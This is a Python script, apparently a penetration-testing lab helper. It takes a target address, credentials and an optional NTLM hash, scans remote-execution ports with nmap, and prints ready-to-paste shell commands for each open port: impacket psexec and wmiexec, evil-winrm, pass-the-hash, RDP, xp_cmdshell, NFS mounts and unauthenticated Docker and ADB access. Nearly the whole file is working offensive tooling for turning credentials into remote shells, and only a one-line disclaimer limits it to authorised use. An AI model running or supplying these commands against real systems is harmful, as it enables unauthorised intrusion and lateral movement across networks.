#!/usr/bin/env python3
"""
cred_shell_helper.py
OSCP lab helper: prompt for IP + creds, short-scan remote-exec ports,
print copy-paste shell commands for each open door.

Use ONLY on machines you are authorised to test.
"""

from __future__ import annotations

import getpass
import shutil
import subprocess
import sys
from shlex import quote

RED = "\033[0;31m"
GRN = "\033[0;32m"
YEL = "\033[1;33m"
CYN = "\033[0;36m"
BLD = "\033[1m"
NC = "\033[0m"

PORTS = [
    21, 22, 23, 111, 135, 139, 445, 1433, 1521, 2049,
    2375, 2376, 3306, 3389, 5432, 5555, 5900, 5985, 5986,
    6443, 8172, 9200, 27017, 47001,
]

TOOLS = ["nmap", "nxc", "crackmapexec", "evil-winrm", "ssh", "xfreerdp", "xfreerdp3"]


def banner() -> None:
    print()
    print(f"{BLD}{CYN}========================================{NC}")
    print(f"{BLD}{CYN}  Creds → Shell helper (lab use only){NC}")
    print(f"{BLD}{CYN}========================================{NC}")
    print()


def parse_user(raw: str, domain: str) -> tuple[str, str]:
    user = raw.strip()
    if "\\" in user:
        domain, user = user.split("\\", 1)
    elif "/" in user and not user.startswith("/"):
        # domain/user  (not a unix path)
        maybe_dom, maybe_user = user.split("/", 1)
        if maybe_user and " " not in maybe_dom:
            domain, user = maybe_dom, maybe_user
    return user, domain.strip()


def print_hit(title: str, why: str, cmds: list[str]) -> None:
    print()
    print(f"{GRN}[+] {title}{NC}")
    print(f"    {why}")
    print(f"{BLD}    Copy-paste:{NC}")
    for line in cmds:
        print(f"    {CYN}{line}{NC}")


def run_nmap(target: str) -> set[int]:
    port_arg = ",".join(str(p) for p in PORTS)
    print()
    print(f"{YEL}[*] Short TCP scan of {target} on remote-exec-ish ports...{NC}")
    print(f"    {port_arg}")
    print()

    if not shutil.which("nmap"):
        print(f"{RED}nmap not found. Install nmap or scan manually.{NC}")
        print("Printing ALL templates below so you can pick by hand.")
        return set()

    cmd = [
        "nmap", "-Pn", "-n", "-T4", "--open",
        "-p", port_arg, target,
    ]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        print(f"{RED}nmap timed out.{NC}")
        return set()

    print(f"{BLD}--- nmap highlights ---{NC}")
    open_ports: set[int] = set()
    any_line = False
    for line in proc.stdout.splitlines():
        line = line.strip()
        if "/tcp" in line and "open" in line:
            print(line)
            any_line = True
            try:
                open_ports.add(int(line.split("/")[0]))
            except ValueError:
                pass
    if not any_line:
        print("(no open ports in the short list, or nmap failed)")
        if proc.stderr.strip():
            print(proc.stderr.strip()[:500])
    return open_ports


def main() -> int:
    banner()

    target = input("Target IP or hostname: ").strip()
    if not target:
        print("No target given.")
        return 1

    username_raw = input("Username (user or DOMAIN\\user or domain/user): ").strip()
    password = getpass.getpass("Password: ")
    domain = input("Domain (blank if local / workgroup / Linux): ").strip()
    nthash = input("Optional NTLM hash (blank to skip PTH commands): ").strip()

    user, domain = parse_user(username_raw, domain)

    if domain:
        imp_auth = f"{domain}/{user}:{password}"
        win_user = f"{domain}\\{user}"
        d_flag = f"-d {quote(domain)}"
        domain_prefix = f"{domain}/"
    else:
        imp_auth = f"{user}:{password}"
        win_user = user
        d_flag = ""
        domain_prefix = ""

    qpass = quote(password)
    quser = quote(user)
    qwin = quote(win_user)

    print()
    print(f"{YEL}[*] Checking local tools...{NC}")
    for t in TOOLS:
        if not shutil.which(t):
            print(f"{YEL}[!] {t} not in PATH — related commands still printed.{NC}")

    open_ports = run_nmap(target)
    # If nmap missing, treat as "unknown" and still print Windows/Linux cheat sheet at end
    scan_ran = shutil.which("nmap") is not None
    found = False

    def hit(title: str, why: str, cmds: list[str]) -> None:
        nonlocal found
        found = True
        print_hit(title, why, cmds)

    print()
    print(f"{BLD}======== Recommended shells based on OPEN ports ========{NC}")

    if not scan_ran:
        print(f"{YEL}[*] No nmap — skipping port filter, showing common templates only at the bottom.{NC}")
    else:
        if 22 in open_ports:
            hit(
                "SSH (22) — good first try on Linux (sometimes Windows OpenSSH)",
                "Works because sshd accepted the TCP handshake. Auth is password or key. Best Linux interactive shell.",
                [
                    f"ssh {user}@{target}",
                    f"ssh {user}@{target} -o PreferredAuthentications=password -o PubkeyAuthentication=no",
                    f"ssh '{win_user}@{target}'",
                ],
            )

        if 23 in open_ports:
            hit(
                "Telnet (23) — only if you have no better door",
                "Cleartext login. Rare on modern labs. Last resort.",
                [
                    f"telnet {target}",
                    "# then type username / password when prompted",
                ],
            )

        if 21 in open_ports:
            hit(
                "FTP (21) — rarely code exec; still a creds POC",
                "Confirms the password works. Code exec only if you can write a web root or trigger a later chain.",
                [
                    f"ftp {target}",
                    f"# user: {user}",
                    f"lftp -u {user},{qpass} {target}",
                ],
            )

        if 135 in open_ports:
            cmds = [
                f"impacket-wmiexec {imp_auth}@{target}",
                f"wmiexec.py {imp_auth}@{target}",
                f"nxc wmi {target} -u {quser} -p {qpass} {d_flag}".rstrip(),
                f"crackmapexec wmi {target} -u {quser} -p {qpass} {d_flag}".rstrip(),
            ]
            if nthash:
                cmds.append(
                    f"impacket-wmiexec -hashes :{nthash} {domain_prefix}{user}@{target}"
                )
            hit(
                "WMI / DCOM (135) — wmiexec family",
                "Port 135 is the RPC mapper. wmiexec does NOT require 445. Needs admin-equivalent rights to spawn a process. High RPC ports must not be firewalled after 135.",
                cmds,
            )

        if 445 in open_ports or 139 in open_ports:
            cmds = [
                f"nxc smb {target} -u {quser} -p {qpass} {d_flag}".rstrip(),
                f"crackmapexec smb {target} -u {quser} -p {qpass} {d_flag}".rstrip(),
                f"smbclient -U '{win_user}%{password}' //{target}/C$",
                f"smbclient -L //{target} -U '{win_user}%{password}'",
                f"impacket-psexec {imp_auth}@{target}",
                f"impacket-smbexec {imp_auth}@{target}",
                f"impacket-atexec {imp_auth}@{target} whoami",
                f"nxc smb {target} -u {quser} -p {qpass} {d_flag} -x whoami".replace("  ", " ").strip(),
            ]
            if nthash:
                cmds.append(f"nxc smb {target} -u {quser} -H {nthash} {d_flag}".rstrip())
                cmds.append(f"impacket-psexec -hashes :{nthash} {domain_prefix}{user}@{target}")
            hit(
                "SMB (445/139) — psexec / smbexec / atexec / file access",
                "SMB open means you can test auth, list shares, and (if local admin) get a shell via service or scheduled task. Classic Windows admin door.",
                cmds,
            )

        if 5985 in open_ports or 5986 in open_ports or 47001 in open_ports:
            ssl = " -S" if (5986 in open_ports and 5985 not in open_ports) else ""
            cmds = [
                f"evil-winrm -i {target} -u {quser} -p {qpass}{ssl}",
                f"evil-winrm -i {target} -u {quser} -p {qpass} -S",
                f"nxc winrm {target} -u {quser} -p {qpass} {d_flag}".rstrip(),
            ]
            if nthash:
                cmds.append(f"evil-winrm -i {target} -u {quser} -H {nthash}")
            hit(
                "WinRM (5985/5986) — Evil-WinRM / PSRemoting",
                "WinRM is listening. Evil-WinRM uses the same protocol as PowerShell Remoting. Needs valid creds; account must be allowed to use WinRM (often Administrators or Remote Management Users).",
                cmds,
            )

        if 3389 in open_ports:
            cmds = [
                f"xfreerdp /u:{qwin} /p:{qpass} /v:{target} /dynamic-resolution /cert:ignore",
                f"xfreerdp3 /u:{qwin} /p:{qpass} /v:{target} /cert:ignore",
                f"rdesktop {target} -u {quser} -p {qpass}",
            ]
            if nthash:
                cmds.append(f"xfreerdp /u:{quser} /pth:{nthash} /v:{target} /cert:ignore")
            hit(
                "RDP (3389) — GUI session",
                "Creds that work on RDP give a full desktop. Good when you need GUI or the account cannot use WinRM/SMB exec.",
                cmds,
            )

        if 1433 in open_ports:
            hit(
                "MSSQL (1433) — mssqlclient / xp_cmdshell",
                "SQL or Windows auth. Code exec only if the login can use xp_cmdshell or OLE. Confirm login first, then check privileges.",
                [
                    f"impacket-mssqlclient {imp_auth}@{target}",
                    f"impacket-mssqlclient {imp_auth}@{target} -windows-auth",
                    f"nxc mssql {target} -u {quser} -p {qpass} {d_flag}".rstrip(),
                    "# inside SQL: EXEC xp_cmdshell 'whoami';  (only if enabled + permitted)",
                ],
            )

        if 3306 in open_ports:
            hit(
                "MySQL (3306)",
                "Login POC first. Code exec only via FILE / UDF / app path — not automatic.",
                [
                    f"mysql -h {target} -u {quser} -p{password}",
                    f"nxc mysql {target} -u {quser} -p {qpass}",
                ],
            )

        if 5432 in open_ports:
            hit(
                "PostgreSQL (5432)",
                "Login POC. Code exec possible via COPY TO PROGRAM if superuser.",
                [
                    f"PGPASSWORD={qpass} psql -h {target} -U {quser} -d postgres",
                    f"PGPASSWORD={qpass} psql -h {target} -U {quser} -c 'select version();'",
                ],
            )

        if 1521 in open_ports:
            hit(
                "Oracle (1521)",
                "Needs SID/service name. Code exec is privilege-dependent.",
                [
                    f"sqlplus '{user}/{password}@{target}/XE'",
                    f"# odat all -s {target} -U {quser} -P {qpass} -d XE",
                ],
            )

        if 2049 in open_ports or 111 in open_ports:
            hit(
                "NFS / rpcbind (2049/111) — not password auth",
                "NFS usually ignores your user password. Open export can still mean file write → cron, authorized_keys, web root.",
                [
                    f"showmount -e {target}",
                    f"mkdir -p /tmp/nfs && mount -t nfs {target}:/ /tmp/nfs -o nolock,vers=3",
                ],
            )

        if 5900 in open_ports:
            hit(
                "VNC (5900)",
                "Often a separate VNC password, not your domain password. Try if the lab reused creds.",
                [
                    f"vncviewer {target}",
                    f"xtightvncviewer {target}",
                ],
            )

        if 2375 in open_ports or 2376 in open_ports:
            hit(
                "Docker API (2375/2376) — often NO creds needed",
                "Exposed Docker socket is usually unauthenticated RCE. Your user/pass may be irrelevant.",
                [
                    f"curl -s http://{target}:2375/version",
                    f"docker -H tcp://{target}:2375 ps",
                ],
            )

        if 6443 in open_ports:
            hit(
                "Kubernetes API (6443)",
                "Needs a token/kubeconfig more often than user/password.",
                [
                    f"curl -sk https://{target}:6443/version",
                    f"kubectl --server=https://{target}:6443 --insecure-skip-tls-verify get --raw=/healthz",
                ],
            )

        if 8172 in open_ports:
            hit(
                "IIS Web Deploy (8172)",
                "If these creds are IIS managers, msdeploy can push files = code exec on the site.",
                [
                    f"# msdeploy -verb:sync -source:contentPath=... -dest:computerName={target},userName={user},password=...",
                ],
            )

        if 9200 in open_ports:
            hit(
                "Elasticsearch (9200)",
                "Often no auth. If auth is on, try the same creds.",
                [f"curl -u '{user}:{password}' http://{target}:9200/"],
            )

        if 27017 in open_ports:
            hit(
                "MongoDB (27017)",
                "Often no auth. If auth enabled, try these creds.",
                [f"mongosh --host {target} -u {quser} -p {qpass}"],
            )

        if 5555 in open_ports:
            hit(
                "ADB (5555)",
                "Android debug bridge. Password usually unused.",
                [
                    f"adb connect {target}:5555",
                    f"adb -s {target}:5555 shell",
                ],
            )

    print()
    print(f"{BLD}======== If scan missed a port, pick by protocol ========{NC}")
    print(f"{YEL}Linux-ish{NC}")
    print(f"  22  ssh {user}@{target}")
    print(f"{YEL}Windows-ish (need matching port OPEN; psexec/wmiexec usually need local admin){NC}")
    print(f"  5985 evil-winrm -i {target} -u {quser} -p {qpass}")
    print(f"  445  impacket-psexec {imp_auth}@{target}")
    print(f"  135  impacket-wmiexec {imp_auth}@{target}")
    print(f"  3389 xfreerdp /u:{qwin} /p:{qpass} /v:{target} /cert:ignore")
    print(f"  1433 impacket-mssqlclient {imp_auth}@{target} -windows-auth")

    print()
    print(f"{BLD}======== How to read results (do not waste time) ========{NC}")
    print("  Auth OK + shell prompt                         → valid vector, stay here")
    print("  STATUS_LOGON_FAILURE / 1326                    → bad user/pass or wrong domain")
    print("  Access denied / STATUS_ACCESS_DENIED           → creds work but user is not admin on THIS box")
    print("  Connection refused / timed out                 → that protocol is not listening — switch port")
    print("  WinRM AuthorizationError                       → try 445/135/3389 with same creds")
    print("  wmiexec hangs after 135                        → RPC high ports filtered — try SMB or WinRM")
    print("  psexec SMB SessionError                         → 445 closed or creds failed")

    if scan_ran and not found:
        print()
        print(f"{RED}[-] Short scan found none of the usual remote-exec ports.{NC}")
        print("    Do a fuller nmap before you decide the host has no door:")
        print(f"    {CYN}nmap -Pn -sV -sC -p- {target}{NC}")

    print()
    print(f"{YEL}Reminder:{NC} same username/password, different ports = different privileges.")
    print("A roastable user often works on WinRM as themselves, but psexec/wmiexec fail until they are local admin.")
    print()
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nAborted.")
        sys.exit(130)
